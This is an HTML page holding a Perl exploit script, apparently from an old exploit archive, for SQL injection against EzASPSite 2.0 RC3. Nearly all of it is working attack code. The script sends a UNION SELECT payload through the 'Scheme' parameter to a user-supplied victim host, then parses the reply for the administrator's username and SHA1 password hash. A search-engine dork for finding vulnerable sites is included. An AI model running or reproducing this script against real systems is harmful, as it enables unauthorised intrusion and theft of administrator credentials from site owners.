<html><head><title>EzASPSite <= 2.0 RC3 (Scheme)  Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#Method found &amp; Exploit scripted by nukedx
#Contacts &gt; ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com
#Original advisory: http://www.nukedx.com/?viewdoc=22
#Usage: ezasp.pl &lt;host&gt; &lt;path&gt;
#googledork: [ &quot;Powered By EzASPSite v2.0 RC3&quot; ] 62.400 Pages..
use IO::Socket;
if(@ARGV != 2) { usage(); }
else { exploit(); }
sub header()
{
  print &quot;\n- NukedX Security Advisory Nr.2006-22\r\n&quot;;
  print &quot;- EzASPSite &lt;= 2.0 RC3 Remote SQL Injection Exploit\r\n&quot;;
}
sub usage() 
{
  header();
  print &quot;- Usage: $0 &lt;host&gt; &lt;path&gt;\r\n&quot;;
  print &quot;- &lt;host&gt; -&gt; Victim's host ex: www.victim.com\r\n&quot;;
  print &quot;- &lt;path&gt; -&gt; Path to EzASPSite ex: /ezasp/\r\n&quot;;
  exit();
}
sub exploit () 
{
  #Our variables...
  $ezserver = $ARGV[0];
  $ezserver =~ s/(http:\/\/)//eg;
  $ezhost   = &quot;http://&quot;.$ezserver;
  $ezdir    = $ARGV[1];
  $ezport   = &quot;80&quot;;
  $eztar    = &quot;Default.asp?Scheme=&quot;;
  $ezxp     = &quot;-1+UNION+SELECT+0,0,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,username,0,0,0,0,0,0,0,0,'NWPX',0,0,0,0,0,0,0+from+tblAuthor+where+Group_ID=1&quot;;
  $ezreq    = $ezhost.$ezdir.$eztar.$ezxp;
  #Sending data...
  header();
  print &quot;- Trying to connect: $ezserver\r\n&quot;;
  $ez = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$ezserver&quot;, PeerPort =&gt; &quot;$ezport&quot;) || die &quot;- Connection failed...\n&quot;;
  print $ez &quot;GET $ezreq HTTP/1.1\n&quot;;
  print $ez &quot;Accept: */*\n&quot;;
  print $ez &quot;Referer: $ezhost\n&quot;;
  print $ez &quot;Accept-Language: tr\n&quot;;
  print $ez &quot;User-Agent: NukeZilla\n&quot;;
  print $ez &quot;Cache-Control: no-cache\n&quot;;
  print $ez &quot;Host: $ezserver\n&quot;;
  print $ez &quot;Connection: close\n\n&quot;;
  print &quot;- Connected...\r\n&quot;;
  while ($answer = &lt;$ez&gt;) {
    if ($answer =~ /&lt;link href=\&quot;forum\/(.*?)\&quot; rel=\&quot;stylesheet\&quot;/) {
      print &quot;- Exploit succeed! Getting admin's information\r\n&quot;;
      print &quot;- USERNAME: $1\r\n&quot;;
    }
    if ($answer =~ /bgcolor=\&quot;NWPX\&quot; background=\&quot;forum\/(.*?)\&quot;&gt;/) {
      print &quot;- SHA1 HASH of PASSWORD: $1\r\n&quot;;
      exit();
    }
    if ($answer =~ /number of columns/) { 
      print &quot;- This version of EzASPSite is vulnerable too\r\n&quot;;
      print &quot;- but default query of SQL-Inj. does not work on it\r\n&quot;;
      print &quot;- So please edit query by manually adding null data..\r\n&quot;;
      exit(); 
    }
  }
  #Exploit failed...
  print &quot;- Exploit failed\n&quot;
}

# nukedx.com [2006-03-29]

# milw0rm.com [2006-03-29]</pre></html>